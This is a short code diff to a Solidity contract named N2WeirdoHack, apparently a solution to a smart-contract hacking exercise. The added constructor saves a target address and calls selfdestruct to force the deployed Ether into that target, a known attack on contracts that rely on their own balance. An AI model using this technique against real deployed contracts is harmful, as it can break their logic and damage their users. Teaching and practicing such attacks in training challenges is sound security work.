@@ -5,7 +5,10 @@ pragma solidity 0.8.11;
 
 contract N2WeirdoHack {
 
-  constructor(address target) payable {
+  address public target;
+  constructor(address _target) payable {
   // Complete with your own code
+  target = _target;
+  selfdestruct(payable(target));
   }
 }
